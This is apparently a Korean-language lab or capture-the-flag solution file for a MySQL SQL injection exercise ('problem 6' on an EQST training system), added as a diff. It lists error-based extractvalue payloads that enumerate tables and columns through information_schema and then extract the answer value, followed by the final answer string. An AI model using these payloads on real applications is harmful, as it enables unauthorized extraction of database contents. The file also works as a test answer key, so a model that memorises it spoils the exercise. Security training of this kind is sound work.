@@ -1,0 +1,18 @@
+=============================
+
+ SQL Injection Mysql 문제 6
+=============================
+
+1. 풆이과정
+
+    쿼리문 유추부터 순서대로 쿼리문 포함해서 쭉 정리해주세요.
+
+hihi%' AND extractvalue(1,concat(0x7e,(SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e)) AND 'p'='p
+hihi%' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e)) AND 'p'='p
+hihi%' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e)) AND 'p'='p
+hihi%' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='eqst_answer' LIMIT 0,1),0x7e)) AND 'p'='p
+hihi%' AND extractvalue(1,concat(0x7e,(SELECT answer_column FROM eqst_answer LIMIT 0,1),0x7e)) AND 'p'='p
+
+2. skinfosec_eqst_lms_system
+
+=============================
